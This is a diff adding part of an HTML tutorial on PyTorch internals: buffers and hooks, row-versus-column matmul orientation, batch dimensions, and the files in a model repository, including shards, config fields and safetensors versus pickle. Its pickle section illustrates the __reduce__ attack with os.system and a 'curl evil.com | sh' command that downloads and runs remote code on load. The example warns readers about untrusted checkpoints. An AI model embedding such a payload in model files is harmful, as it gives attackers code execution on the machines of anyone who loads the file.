+        <li><strong>A buffer is "not learned, but has to come along"</strong> — <code>requires_grad=False</code>, moved by <code>.to()</code>; <strong>a persistent buffer also goes into the state_dict and is published with the weights</strong>. BatchNorm's <code>running_mean</code> / <code>running_var</code> / <code>num_batches_tracked</code> are this tier (the "running statistics" in §4) — measured: the state_dict of <code>nn.Sequential(nn.Linear(4,3), nn.BatchNorm1d(3))</code> contains all three, and <strong>deliberately deleting one and calling <code>load_state_dict</code> fails outright with <code>Missing key(s) in state_dict: "1.running_mean"</code></strong>. So when §5 / §7 say "error if keys don't match the structure", it's not only weights that can fail to match.</li>
+        <li><strong>A plain attribute is "PyTorch doesn't know it exists"</strong> — on no list, not moved by <code>.to()</code>. The <code>plain</code> above is the minimal repro of §2's "some mask forgot <code>.to(device)</code>". It's sneakier than the plain-list trap: with the list, at least the state_dict visibly lacks a whole layer; a plain tensor attribute is <strong>completely silent and only blows up when you change devices</strong>.</li>
+        </ul>
+        <p><strong>The <code>persistent=False</code> tier explains "the key count doesn't add up".</strong> It's meant for things that "can be recomputed on the spot from the config and aren't worth storing in the file". Measured in the modeling code of transformers 5.14.1:</p>
+        <pre><code>transformers/models/qwen3/modeling_qwen3.py:102
+    self.register_buffer(&quot;inv_freq&quot;, inv_freq, persistent=False)
+</code></pre>
+        <p>RoPE's <code>inv_freq</code> (and <code>original_inv_freq</code>) is exactly this — <strong>you won't see it when you dump the safetensors, but it's in the model, in VRAM, and moves with <code>.to()</code>.</strong> So <code>len(state_dict)</code> and "how many tensors the model really has" are two different things. This and Part 2's "<code>config.vocab_size</code> is padded; don't subtract one config from another directly" are two instances of the same kind of trap: <strong>the number in the file ≠ what's actually there at runtime.</strong></p>
+        <p>The second row is exactly "why you always write <code>model(x)</code> and never <code>model.forward(x)</code>" — <code>model(x)</code> goes through <code>nn.Module.__call__</code>, which <strong>runs the hooks first, then calls forward</strong>. And hooks are the mount point for a pile of infrastructure:</p>
+        <ul>
+        <li><strong>accelerate's <code>device_map</code> / offload</strong>: when a large model is loaded in shards, the hooks <strong>sit on every block of the ModuleList</strong> and move the weights to the right device during the forward pass — the line <code>x = blk(x, mask)</code> in <code>Stack.forward</code> above (not <code>blk.forward(...)</code>) is what triggers them in a real model;</li>
+        <li><strong>quantization observers / fake-quant</strong> (calibration captures activations through hooks);</li>
+        <li><strong>profilers, intermediate-activation capture, debugging probes</strong>.</li>
+        </ul>
+        <p><strong>On a pure-PyTorch toy like TinyNet, <code>.forward()</code> and <code>model(x)</code> give exactly the same result — so this trap normally stays hidden; once the model is loaded by HF + accelerate, or has been quantized, calling <code>.forward()</code> directly silently loses that machinery</strong> (typical symptoms: wrong device, quantization not taking effect, the profiler capturing nothing). <strong>The rule is simple: always <code>model(x)</code>.</strong></p>
+        <hr />
+        <h3 id="s8-10">Appendix Two (skippable): that <code>.T</code>, column vectors, and what the "batch dimension" really is</h3>
+        <blockquote>
+        <p>Follow programmer intuition the whole way — <strong>a 1-D array is a row vector</strong>. This section answers three linked questions: where does the <code>.T</code> in the code come from? Why do textbooks write <code>W·x</code> and treat x as a column vector? And — <strong>when the input has more than two dimensions (<code>[B, seq, hidden]</code> and the like), how does this correspondence hold up?</strong> Readers who just want to use <code>x @ W.T</code> without digging can skip straight to §6. (Below we keep using the <code>W₂ = [[1,0,2,0],[0,1,0,3]]</code> from the diagram, look only at the matrix-multiply step, and <strong>leave out the bias b</strong> — b is just an element-wise shift at the end and has nothing to do with orientation.)</p>
+        <p><strong>First, pin down a term, because the word "batch" gets used at three levels.</strong></p>
+        <p>The <strong>batch dimension</strong> in this section means <strong>that one dimension of the tensor</strong> — the B in <code>[B, seq, hidden]</code>. It has only one meaning: <strong>this <code>forward</code> call processed B samples at once.</strong></p>
+        <p>What's easy to confuse: <strong>the same B can come from three completely different places, and the model neither knows nor cares</strong>:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Where B comes from</th>
+        <th>Scenario</th>
+        <th>What it's called</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>A small slice cut from the <strong>training set</strong></td>
+        <td>Training</td>
+        <td><strong>mini-batch</strong> ("mini" relative to "the whole training set")</td>
+        </tr>
+        <tr>
+        <td>You pass in 100 items in one call</td>
+        <td>Offline batch inference</td>
+        <td>Just what you passed in</td>
+        </tr>
+        <tr>
+        <td>The server groups 32 concurrent requests into one batch</td>
+        <td>Online serving</td>
+        <td><strong>batching / dynamic batching</strong> (Part 2)</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>Three sources, the same B, the same <code>forward</code> code. <strong>So this section talks only about "how many are in the shape", not "how they got there".</strong> In passing: at inference there's no "whole dataset" to be relative to, so <strong>the term mini-batch doesn't apply on the inference side</strong>.</p>
+        <p><strong>There's one more property to remember along with it, and it's the premise for everything that follows: the B samples in the batch dimension are independent of each other</strong> — they run through the same code and share the same weights, but <strong>exchange no information with each other</strong>; split them up and compute separately and the results are identical. That explains two things: ① why the server can freely group and split batches; ② what batching actually saves — <strong>the weights are read from VRAM once and shared by B samples</strong>. (The one exception is BatchNorm, which computes statistics across samples during training; but at inference <code>eval()</code> uses fixed running statistics, so the property holds cleanly on the inference side — see §4 and Appendix One.)</p>
+        </blockquote>
+        <p><strong>(0) First lay the foundation: in PyTorch the features are always in the last dimension.</strong></p>
+        <p>Many people (including an earlier version of this document) say "the foundation is that batch is always in dimension 0". That isn't precise enough, and it's not the real cause — <strong><code>nn.RNN</code> / <code>nn.LSTM</code> default to <code>[seq, batch, feature]</code>: batch is not in dimension 0, but feature is still in the last dimension.</strong> What really fixes everything is this:</p>
+        <blockquote>
+        <p><strong><code>nn.Linear</code> takes <code>[*, in]</code> and returns <code>[*, out]</code> — features in the last dimension, as many dimensions in front as you like.</strong></p>
+        </blockquote>
+        <p>Why must it be this way? Because <strong>the rule of <code>matmul</code> is: treat the last two dimensions as the matrix and every dimension in front as "batch dimensions" to be broadcast away</strong> (the broadcasting section of §1 covers exactly this rule). As long as the features stay in the last dimension, <strong>adding any number of dimensions in front requires no code change</strong>. Measured:</p>
+        <pre class="python"><code>W = np.random.randn(2, 4)          # [out=2, in=4], i.e. the weight of nn.Linear(4,2)
+
+x(4,)              @ W.T  -&gt;  (2,)               # single sample
+x(8, 4)            @ W.T  -&gt;  (8, 2)             # [B, in]
+x(8, 16, 4)        @ W.T  -&gt;  (8, 16, 2)         # [B, seq, in]      ← the normal case for a transformer
+x(8, 12, 16, 4)    @ W.T  -&gt;  (8, 12, 16, 2)     # [B, heads, seq, in] ← inside multi-head attention
+</code></pre>
+        <p><strong>One <code>nn.Linear</code> handles all four shapes without changing a single character of code.</strong> That's what "features in the last dimension" buys you.</p>
+        <p>The column view (the textbook <code>W @ x</code>) can't do this — it requires <strong>features in the second-to-last dimension</strong>, with the last dimension taken by the samples:</p>
+        <pre class="python"><code>x(4, 1)     W @ x  -&gt;  (2, 1)        feature dim at axis=0
+x(4, 8)     W @ x  -&gt;  (2, 8)        feature dim at axis=0
+x(8, 4, 16) W @ x  -&gt;  (8, 2, 16)    feature dim at axis=1   ← the position moves with the number of dims
+</code></pre>
+        <p>When the number of dimensions changes, <strong>the absolute position of the feature dimension changes with it</strong>. Worse: almost every element-wise operation in PyTorch — LayerNorm, softmax, adding bias, <code>.mean()</code> — <strong>acts on <code>dim=-1</code> by default</strong>. If features aren't last, you have to hand-write <code>dim=-2</code> everywhere.</p>
+        <p><strong>So the real causal chain is:</strong></p>
+        <pre><code>&quot;Features always in the last dimension&quot; (so any number of leading dims can be broadcast away uniformly by matmul)
+   ↓
+matmul treats the last two dims as the matrix → x&#39;s last dim must match W&#39;s first dim
+   ↓
+W is stored as [out, in] (one row per neuron, see the fully connected diagram above) → it must be flipped to [in, out]
+   ↓
+x @ W.T        ← the .T is forced on you, not added casually
+</code></pre>
+        <p><strong>"Batch in dimension 0" is a corollary of this chain in the 2-D case</strong>, not its cause. The textbook version — "x as a column vector, write <code>W·x</code>" — looks different only because it <strong>handles a single sample with no leading dimensions to accommodate</strong>. How the two line up: see (4).</p>
+        <p><strong>(1) Follow the foundation and <code>.T</code> isn't mysterious at all.</strong> Given that <strong>x is a row and a batch is <code>[batch, in]</code></strong>, and <strong>W is <code>[out, in]</code></strong>, only one thing remains: dot the row vector x with <strong>each row</strong> of W.</p>
+        <ul>
+        <li>Matrix multiplication <code>A @ B</code> requires <strong>A's last dimension = B's first dimension</strong> (inner dimensions aligned).</li>
+        <li>Writing <code>x @ W</code> directly: <code>[batch, in] @ [out, in]</code>, inner dimensions <code>in</code> vs <code>out</code> <strong>don't match — illegal</strong>.</li>
+        <li>Transpose W → <code>W.T</code> is <code>[in, out]</code>, so <code>x @ W.T = [batch, in] @ [in, out] = [batch, out]</code> ✓.</li>
+        </ul>
+        <p>So <code>.T</code> just flips "W stored by rows" over, turning rows into columns so they line up with the row vector x — <strong>it's not an accidental technical patch but a direct consequence of batch-first row storage.</strong></p>
+        <p><strong>(2) What's the textbook <code>y = W·x</code> about? — look back at the diagram and it's clear.</strong> In the diagram the inputs are <strong>stacked vertically in a column</strong> (x₀ / x₁ / x₂ arranged top to bottom) — <strong>that column is the "column vector" <code>[in, 1]</code> of the math books</strong>. Mathematical convention puts it to the right of W and writes:</p>
+        <pre><code>W · x = [out, in] @ [in, 1] = [out, 1]     ← the output is also a vertical column, matching the y column in the diagram
+</code></pre>
+        <p>The inner dimension <code>in</code> lines up automatically, and "each output node collects all input nodes" in the diagram is exactly each row of W dotted with that column. <strong>Diagrams are naturally drawn vertically, so the math notation is naturally a column vector</strong> — two notations for the same thing.</p>
+        <p>But this is <strong>only a preference of layout</strong>: <code>W · x</code> and <code>x @ W.T</code> compute exactly the same thing ((3) below verifies it on the spot). PyTorch code is <code>x @ W.T</code> from start to finish — <strong>the column vector is notation you'll meet reading papers / textbooks, not something to remember for writing code.</strong></p>
+        <p><strong>(3) Why a 1-D array "has no orientation".</strong> Programmers often get muddled here: the textbook says "x is a column vector", yet you know that <code>[2,5,1,2]</code> in code looks more like a row vector. Who's right? — <strong>both, but they aren't talking about the same thing</strong>:</p>
+        <ol>
+        <li><strong>A "column vector" in math is a convention, not a data structure.</strong> In <code>y = W·x</code>, x is by convention stood up as a column — an <code>[in,1]</code> matrix. The math shorthand <code>[in]</code> means "a column vector with in components", <strong>not</strong> a 1-D array of length in in programming.</li>
+        <li><strong>A NumPy / PyTorch 1-D array has no orientation of its own.</strong> <code>x.shape == (in,)</code> is <strong>neither</strong> <code>[in,1]</code> (column) <strong>nor</strong> <code>[1,in]</code> (row). So the intuition "a 1-D array isn't a column vector" is correct.</li>
+        <li><strong>"Orientation" is given temporarily by the position in <code>@</code>, not carried by the array:</strong></li>
+        </ol>
+        <table>
+        <thead>
+        <tr>
+        <th>Position of x</th>
+        <th>Official rule</th>
+        <th>Treated as</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><strong>Right of <code>@</code></strong> (<code>W @ x</code>)</td>
+        <td>Append a 1 <strong>after</strong> the dimension → <code>[in,1]</code>, removed after multiplying</td>
+        <td><strong>column</strong></td>
+        </tr>
+        <tr>
+        <td><strong>Left of <code>@</code></strong> (<code>x @ W.T</code>)</td>
+        <td>Prepend a 1 <strong>before</strong> the dimension → <code>[1,in]</code>, removed after multiplying</td>
+        <td><strong>row</strong></td>
+        </tr>
+        </tbody>
+        </table>
+        <p>The same array is a row on the left and a column on the right, and the two forms give <strong>the same result</strong>:</p>
+        <pre class="python"><code>import numpy as np
+W = np.array([[1,0,2,0],[0,1,0,3]])   # [out=2, in=4]
+x = np.array([2,5,1,2])               # 1-D, shape (4,)
+
+W @ x        # array([ 4, 11])   x on the right → treated as a column (how the textbook diagram reads)
+x @ W.T      # array([ 4, 11])   x on the left → treated as a row (how PyTorch writes it)
+# Exactly equal; vertical or horizontal, it&#39;s two layouts of the same operation
+</code></pre>
+        <p>This "prepend / append a 1" rule is written down officially, in two places (if you want to check the primary source):</p>
+        <ul>
+        <li><strong>NumPy</strong> <code>numpy.matmul</code>, the Notes section: <a href="https://numpy.org/doc/stable/reference/generated/numpy.matmul.html">https://numpy.org/doc/stable/reference/generated/numpy.matmul.html</a></li>
+        <li><strong>PyTorch</strong> <code>torch.matmul</code> (same wording as NumPy): <a href="https://docs.pytorch.org/docs/stable/generated/torch.matmul.html">https://docs.pytorch.org/docs/stable/generated/torch.matmul.html</a></li>
+        </ul>
+        <p>(Both pages have examples where <code>matmul(a, b)</code> and <code>matmul(b, a)</code> return the same result for the same 1-D array — official proof that "orientation is decided by position".)</p>
+        <p><strong>(4) The key point: once there's a batch, how does the column-vector picture correspond?</strong> This is where people get stuck most, so let's say it outright — <strong>the fully connected diagram is essentially a "single-sample" diagram</strong>: the vertical column of inputs = <strong>one</strong> sample = <code>[in,1]</code>, which is why <code>W·x</code> can be read straight off it. <strong>Neurons drawn vertically naturally look like a column, but that's only "how one sample's neurons are laid out"; it doesn't force you to store the data by columns.</strong></p>
+        <p><strong>The batch dimension isn't in the diagram at all; it's "repetition", not "structure".</strong> You don't add nodes to the diagram for batch; you run <strong>the same diagram B times</strong>. Only one thing remains: how to stack those B copies — <strong>and here there happen to be two conventions, which is the root of the confusion:</strong></p>
+        <ul>
+        <li><strong>Math / column view</strong>: one sample per column <code>[in,1]</code>, B of them side by side → <code>X_col = [in, B]</code> (one sample per <strong>column</strong>). Compute <code>W @ X_col = [out,in] @ [in,B] = [out,B]</code>, one output per <strong>column</strong>. <strong>This is the single-sample diagram, widened directly.</strong></li>
+        <li><strong>PyTorch / row view</strong>: batch goes <strong>first</strong>, samples are <strong>rows</strong> → <code>X_row = [B, in]</code> (one sample per <strong>row</strong>). To keep W stored as <code>[out,in]</code> and x as a row, compute <code>X_row @ W.T = [B,in] @ [in,out] = [B,out]</code>, one output per <strong>row</strong>.</li>
+        </ul>
+        <p><strong>The two are exact transposes:</strong> <code>X_row = X_col.T</code>; transpose both sides of the column-view equation and you get the row view — <code>Y_col = W @ X_col</code> → <code>Y_col.T = X_col.T @ W.T</code> = <code>X_row @ W.T</code>. <strong>The same numbers, just lying in a different direction; nothing extra is computed.</strong> Take the W above through two samples <code>[2,5,1,2]</code>, <code>[1,1,1,1]</code> (still no b):</p>
+        <pre><code>Column view (math)    X_col = [[2,1],        one sample per [column] [in=4, B=2]
+                               [5,1],
+                               [1,1],
+                               [2,1]]
+                      W @ X_col = [[ 4,3],           one output per [column] [out=2, B=2]
+                                   [11,4]]
+
+Row view (PyTorch)    X_row = [[2,5,1,2],    one sample per [row] [B=2, in=4]
+                               [1,1,1,1]]
+                      X_row @ W.T = [[4,11],         one output per [row] [B=2, out=2]
+                                     [3, 4]]
+
+Transposes of each other: (W @ X_col).T == X_row @ W.T           ✓
+</code></pre>
+        <p><strong>Why does PyTorch choose rows rather than columns, which match the diagram better?</strong> Back to the foundation in (0): <strong>features must be in the last dimension</strong>, so that any number of leading dimensions can be broadcast away uniformly by matmul. The column view puts features in the second-to-last dimension, which means giving up that property — and real model inputs are <code>[B, seq, hidden]</code>, <code>[B, heads, seq, head_dim]</code>, with more than one leading dimension, so it can't be given up.</p>
+        <p><strong>And this fills in the half-sentence (0) left unfinished: why you don't notice with a single sample and it only shows up once there's a batch dimension.</strong> For <strong>one</strong> 1-D array alone, <code>W @ x</code> and <code>x @ W.T</code> give the same result (the add-a-1 rule above) — so at the single-sample level "an array has no orientation" and the column view is good enough as intuition. <strong>But once there's a batch, the symmetry breaks</strong>: a 2-D <code>[B,in]</code> is explicitly "samples by row", and matmul does <strong>not</strong> transpose 2-D operands for you, so you're locked into <code>X @ W.T</code>. <strong>So the column view is the mental picture for "a single sample / a single neuron"; the row view is the one that scales all the way to <code>[B, heads, seq, in]</code>.</strong></p>
+        <blockquote>
+        <p><strong>An honest caveat:</strong> "vectors are columns by default" is <strong>the mainstream convention, not an iron law</strong>. A few fields (older computer graphics, some statistics literature) do the opposite and use <strong>row vectors + right-multiplication</strong> <code>x·W</code>. So the precise statement is: mainstream linear algebra and ML math convention treat vectors as columns and left-multiply by W; PyTorch code lands on <code>x @ W.T</code> in order to keep features in the last dimension. Both are self-consistent; don't take either one as the only correct one.</p>
+        </blockquote>
+        <hr />
+        <h2 id="s9">6. One complete forward pass: putting the above together</h2>
+        <p>Below is the minimal skeleton of "hand-writing one inference"; what your inference engine does internally is essentially the industrial version of this:</p>
+        <pre class="python"><code>model = TinyNet(4).to(&quot;cuda&quot;).eval()      # 1. onto the GPU + inference mode (4 features, matching the input below)
+model = model.to(torch.bfloat16)          # 2. half precision to save VRAM
+
+x = torch.randn(32, 4, device=&quot;cuda&quot;, dtype=torch.bfloat16)  # 3. input with batch=32, device/dtype aligned
+
+with torch.inference_mode():              # 4. don&#39;t build the graph
+    logits = model(x)                     # 5. forward
+
+torch.cuda.synchronize()                  # 6. only needed when you actually time it
+</code></pre>
+        <p>Note the <strong>batch dimension</strong> in step 3. The 32 in <code>[32, 4]</code> means "compute 32 samples at once", not "32 requests" — <strong>how many samples are in one forward and where those samples came from are two different things</strong>.</p>
+        <p>Why this dimension exists: a GPU is a parallel machine; one sample through one forward leaves almost all the compute idle. Put many samples into the same forward and <strong>the weights are read from VRAM once and shared by all of them</strong>, so arithmetic intensity goes straight up. This is the first lever of inference performance, and what the whole inference-engine ecosystem (vLLM's continuous batching, all kinds of batch scheduling) is built around — <strong>but those are "where the samples come from" questions, which belong to Part 2</strong>. This part only needs to nail down one thing:</p>
+        <blockquote>
+        <p><strong>Merged into one forward, the weights are read once; each running its own forward, they're fighting over the same memory bus.</strong></p>
+        </blockquote>
+        <hr />
+        <h2 id="s10">7. What a model looks like on disk: the full picture of the files in a repo</h2>
+        <p>When you download a model, the pile of files in the directory falls into three groups, corresponding to three different things:</p>
+        <p><strong>Group 1: structure + weights (the model itself)</strong></p>
+        <ul>
+        <li><code>config.json</code> — the model's "manual": the architecture class name (<code>architectures</code>, e.g. <code>Qwen3ForCausalLM</code> / <code>BertModel</code>), hyperparameters (hidden_size, num_layers, vocab_size), and <code>dtype</code> (the dtype the weights are stored / loaded in, see §3; before transformers 5 this field was called <code>torch_dtype</code>, older model directories still use that name, and both are accepted). It describes only the structure and <strong>contains no weights</strong>.</li>
+        <li><code>model.safetensors</code> / <code>pytorch_model.bin</code> — <strong>the weight data</strong>, i.e. the <code>state_dict</code> from §5. Larger models are not a single file but <strong>shards</strong>; see "Shards" below.</li>
+        <li><code>generation_config.json</code> — <strong>sampling defaults</strong>: <code>temperature</code>, <code>top_p</code>, <code>top_k</code>, <code>repetition_penalty</code>, <code>eos_token_id</code>, <code>pad_token_id</code>. It's not part of "the structure", but inference engines read it by default (vLLM's <code>--generation-config auto</code> reads exactly this file), so <strong>if the same weights in a different directory produce a different output style or won't stop, diff this file first</strong> — especially <code>eos_token_id</code>, which is often a list; miss one entry and generation doesn't stop.</li>
+        </ul>
+        <p><strong>Group 2: the tokenizer (text ↔︎ tokens)</strong> — <code>tokenizer.json</code>, <code>vocab.json</code>/<code>merges.txt</code>, <code>tokenizer_config.json</code>, <code>chat_template.jinja</code> (from transformers 5 the chat template is split out of <code>tokenizer_config.json</code> into its own file), etc. (detailed in Part 2).</p>
+        <p><strong>Group 3 (embedding models only): the sentence-transformers wrapper</strong> — <code>modules.json</code>, <code>1_Pooling/config.json</code> (defines the pooling method; bge uses CLS), detailed in Part 2.</p>
+        <p>In one sentence: <strong>model = structure (config + code) + weights (safetensors) + tokenizer (vocab etc.)</strong>, stored separately, each with its own job.</p>
+        <h3 id="s10-1">Shards: why the directory doesn't have one <code>model.safetensors</code></h3>
+        <p>Weights above a certain size are cut into <strong>shards</strong>; an 8B bf16 model (16 GB) is commonly cut into 4:</p>
+        <pre><code>model-00001-of-00004.safetensors
+model-00002-of-00004.safetensors
+model-00003-of-00004.safetensors
+model-00004-of-00004.safetensors
+model.safetensors.index.json        ← index: which key is in which file
+</code></pre>
+        <p><strong>How big each shard is depends on which version of transformers saved it.</strong> This default (<code>max_shard_size</code> in <code>save_pretrained</code>) keeps changing: early on 10 GB → for a long stretch 5 GB → by 5.17 it's <code>"50GB"</code>. So on the Hub you'll see old models cut into a dozen-plus 5 GB shards next to new models that are a single block of tens of GB. <strong>The takeaway isn't to remember a number, but: don't infer model structure from the number and size of files; read <code>index.json</code>.</strong></p>
+        <p><code>index.json</code> has only two fields, both directly useful:</p>
+        <pre class="json"><code>{
+  &quot;metadata&quot;: { &quot;total_size&quot;: 16382640128 },          ← total weight bytes; no need for §3&#39;s mental arithmetic, just read it
+  &quot;weight_map&quot;: {
+    &quot;model.embed_tokens.weight&quot;: &quot;model-00001-of-00004.safetensors&quot;,
+    &quot;model.layers.0.self_attn.q_proj.weight&quot;: &quot;model-00001-of-00004.safetensors&quot;,
+    ...
+    &quot;lm_head.weight&quot;: &quot;model-00004-of-00004.safetensors&quot;
+  }
+}
+</code></pre>
+        <p>What <code>total_size</code> counts, checked in the <code>huggingface_hub</code> source that splits shards (<code>serialization/_base.py</code>, which sums <code>untyped_storage().nbytes()</code> per tensor, deduplicated by storage): it's <strong>the sum of the storage bytes of all tensors</strong>, excluding the safetensors header JSON, and weights that share storage (tied weights, see later in this section) are counted only once — so it comes out <strong>a tiny bit smaller</strong> than the shard files added up. It's entirely good enough for VRAM estimates. To check it yourself, five lines will do:</p>
+        <pre class="python"><code>import torch, torch.nn as nn
+from huggingface_hub import split_torch_state_dict_into_shards
+emb, lm = nn.Embedding(1000, 64), nn.Linear(64, 1000, bias=False)
+lm.weight = emb.weight                                     # tie
+sd = {&quot;embed.weight&quot;: emb.weight.data, &quot;lm_head.weight&quot;: lm.weight.data, &quot;fc.weight&quot;: torch.zeros(300, 64)}
+print(split_torch_state_dict_into_shards(sd, max_shard_size=100_000).metadata)
+# {&#39;total_size&#39;: 332800} = 1000×64×4 + 300×64×4 — the tie counted once; counting it twice would give 588800
+</code></pre>
+        <p><code>weight_map</code> is §5's "keys are attribute paths" plus one more layer, "→ which file". The loader finds files from it and opens them as needed; the split <strong>divides the volume evenly by key</strong>, unrelated to model structure, so one layer's q/k/v may straddle two files — don't treat file boundaries as layer boundaries. <strong>Both "inspect it yourself" scripts below have to be adapted to this structure</strong>: iterate over every <code>*.safetensors</code> in the directory, or read <code>index.json</code> first.</p>
+        <h3 id="s10-2"><code>architectures</code>: deciding which code loads the model</h3>
+        <p>The <code>architectures</code> field in <code>config.json</code> is <strong>the single most critical one</strong> in the whole loading process, worth three sentences of its own.</p>
+        <p><strong>First, it's not a description, it's an instruction.</strong> The loader (transformers' <code>AutoModel.from_pretrained</code>, every inference engine) reads this string and looks it up in its own <strong>registry</strong>, mapping it to "which Python class builds this model". If found, it builds the model with that code and pours in the weights; if not, it errors. <strong>So it's a routing key, not a model identifier.</strong></p>
+        <p><strong>Second, the naming convention is <code>{model family}For{task}</code></strong>, where the suffix says which head is attached:</p>
+        <table>
+        <thead>
+        <tr>
+        <th>Suffix</th>
+        <th>Meaning</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td><code>ForCausalLM</code></td>
+        <td>Autoregressive language-model head, predicting token by token</td>
+        </tr>
+        <tr>
+        <td><code>ForConditionalGeneration</code></td>
+        <td>Conditional generation, usually encoder-decoder or multimodal</td>
+        </tr>
+        <tr>
+        <td><code>ForSequenceClassification</code> / <code>ForTokenClassification</code></td>
+        <td>Discriminative heads</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>The same base shows up under several names: <code>Qwen3ForCausalLM</code> (text only), <code>Qwen3VLForConditionalGeneration</code> (vision), <code>Qwen3ASRForConditionalGeneration</code> (transcription) — <strong>the base is Qwen3 in every case, but a different suffix means a completely different loading path.</strong> This is exactly the <strong>file-level</strong> counterpart of §5's "backbone + which head goes on the end".</p>
+        <p><strong>Third, why the names are so "generic":</strong> the single entry <code>Qwen3ForCausalLM</code> covers infinitely many sets of weights — 0.6B / 8B / 32B, plus every fine-tuned version in the world — because they <strong>share the same forward implementation</strong>. Conversely, a model gets its own entry because it <strong>needs its own modeling code</strong>. The rule is "<strong>does it need new code</strong>", not "is it a new model".</p>
+        <blockquote>
+        <p><strong>A practical conclusion: given an unfamiliar model directory, the first thing to do is <code>head -5 config.json</code> and look at <code>architectures</code>.</strong> It decides everything — <strong>and in some cases decides it without an error</strong> (misconfigured, it still loads successfully; the output is just garbage). How people fall into these traps and how to track them down belongs to Part 2.</p>
+        </blockquote>
+        <h3 id="s10-3">What's actually in the state_dict</h3>
+        <p>A <code>state_dict</code> is a dictionary of "parameter name → tensor", holding <strong>all the learnable parameters + persistent buffers</strong> of the <code>nn.Module</code> — more than the intuitive weights + biases:</p>
+        <ul>
+        <li>the weight W and bias b of each Linear</li>
+        <li><strong>the embedding table</strong> (<code>word_embeddings</code> / <code>embed_tokens</code> — the table that looks token ids up as vectors, detailed in Part 2)</li>
+        <li><strong>LayerNorm parameters</strong> (weight γ, bias β)</li>
+        <li>possibly a pooler dense layer, etc.</li>
+        <li><strong>and buffers</strong> — tensors that aren't learnable but are published with the weights. The classic case is BatchNorm's <code>running_mean</code> / <code>running_var</code> (the "running statistics" in §4). <strong>They're <code>requires_grad=False</code>, not parameters, but they really are in the file, and missing one still makes loading fail.</strong> The mechanism, and the other three registration tiers, are at the end of Appendix One.</li>
+        </ul>
+        <p>(Why you may never have been bitten by a buffer: <strong>the transformer family uses LayerNorm / RMSNorm, which have no buffers</strong>; this trap is mainly on the vision-model side. And RoPE's <code>inv_freq</code> is a <code>persistent=False</code> buffer — <strong>in VRAM but not in the file</strong> — so you won't see it in a dump either.)</p>
+        <p>But it <strong>has only numbers, no structure</strong> — how things connect and how forward runs come from the architecture name in <code>config.json</code> + the modeling code. That's why "right weights, wrong code version" fails to load: the state_dict keys don't match the structure.</p>
+        <h3 id="s10-4"><code>.bin</code> vs <code>.safetensors</code>: same content, different format</h3>
+        <table>
+        <thead>
+        <tr>
+        <th></th>
+        <th><code>pytorch_model.bin</code> / <code>model.pt</code></th>
+        <th><code>model.safetensors</code></th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr>
+        <td>What it is</td>
+        <td><code>torch.save()</code> = Python <strong>pickle</strong></td>
+        <td>Pure tensor data + a JSON header</td>
+        </tr>
+        <tr>
+        <td><strong>What it can hold</strong></td>
+        <td><strong>Any Python object</strong> — state_dict, optimizer state, epoch, config, nested dicts</td>
+        <td><strong>Only a flat <code>str → tensor</code> mapping</strong>; no nesting</td>
+        </tr>
+        <tr>
+        <td>Loading</td>
+        <td><code>torch.load()</code>, deserializes the whole object graph into memory</td>
+        <td>mmap, <strong>zero-copy</strong>, single tensors can be loaded lazily</td>
+        </tr>
+        <tr>
+        <td>Listing contents</td>
+        <td>You have to load it to know what's inside</td>
+        <td><strong>The header is the manifest</strong> (name / dtype / shape / offset); you can list it without reading the data</td>
+        </tr>
+        <tr>
+        <td>Safety</td>
+        <td>pickle <strong>can execute arbitrary code</strong> — risky</td>
+        <td>Pure data, <strong>executes no code</strong> — safe</td>
+        </tr>
+        <tr>
+        <td>Speed</td>
+        <td>Deserialize into CPU memory first, then copy to the GPU — one extra full copy in between</td>
+        <td>After mmap into the CPU address space, each tensor is copied straight to the GPU, skipping deserialization and the intermediate copy</td>
+        </tr>
+        </tbody>
+        </table>
+        <p>("mmap" maps the file into the CPU's virtual address space; the data still has to cross PCIe to reach VRAM — safetensors is faster because it <strong>skips pickle deserialization and that intermediate CPU copy</strong>, not because it bypasses the CPU.)</p>
+        <p>When a repo has both, it's for compatibility; the content is the same and the loader <strong>prefers safetensors</strong>. The whole reason the community moved from .bin to .safetensors: safety + speed.</p>
+        <p><strong>The "what it can hold" row is the real reason the training side and the inference side part ways</strong>, worth saying on its own:</p>
+        <ul>
+        <li><strong><code>.pt</code> is a container</strong> — a checkpoint naturally has to hold things beyond tensors: optimizer state, learning-rate schedule, epoch, the full configuration. <strong>safetensors can't hold those</strong> (it's only a flat name → tensor mapping), so the training side isn't "in the habit of using <code>.pt</code>"; it <strong>has no choice</strong>.</li>
+        <li><strong>The inference side needs only tensors</strong>, so it can enjoy safetensors' three benefits: mmap means starting a server doesn't require reading several GB into CPU memory first; <strong>the readable-in-advance header</strong> lets the engine know the tensor manifest before touching the data (so it can plan sharding and tensor-parallel splits ahead of time); and no code execution — a hard requirement when a server loads public weights.</li>
+        </ul>
+        <h3 id="s10-5">Going deeper: the problem with pickle in PyTorch</h3>
+        <p>What exactly is the problem with ".bin is essentially pickle"? <strong>pickle is Python's built-in object serialization</strong> (<code>pickle.dump/load</code>), and <code>torch.save</code> / <code>torch.load</code> use it underneath. Two layers of problems:</p>
+        <ol>
+        <li><strong>It can execute arbitrary code (a fatal security hole).</strong> The pickle format can encode "to rebuild me, call function F with arguments A" (the <code>__reduce__</code> mechanism). A malicious person sets F to <code>os.system</code> and A to <code>"curl evil.com | sh"</code>, and <strong>the instant you <code>torch.load</code> that <code>.bin</code>, it runs</strong> — you haven't even run the model. This is a real attack surface on model hubs that has been exploited. Iron rule: <strong>never <code>torch.load</code> a <code>.bin</code> from an untrusted source.</strong></li>
+        <li><strong>Coupled to Python, not portable.</strong> pickle refers to Python classes by "module path"; rename a class or change a library version and deserialization may fail; and it can only be loaded in Python, read entirely into memory (no mmap, no lazy loading).</li>
+        </ol>
+        <p><strong>Why safetensors fixes it:</strong> it stores only <strong>pure tensor data + a JSON header</strong> (name / dtype / shape / offset), <strong>no code, no Python objects, no <code>__reduce__</code></strong> → nothing can possibly execute at load time → safe; it's also language-agnostic, mmap-able with zero copy, and fast. (Mitigation: <code>weights_only=True</code> in <code>torch.load</code> restricts deserialization to the safe subset of "tensors only, no code execution", and has been the default since PyTorch 2.6 — but writing it out explicitly is safer, and safetensors is the cleaner solution.)</p>
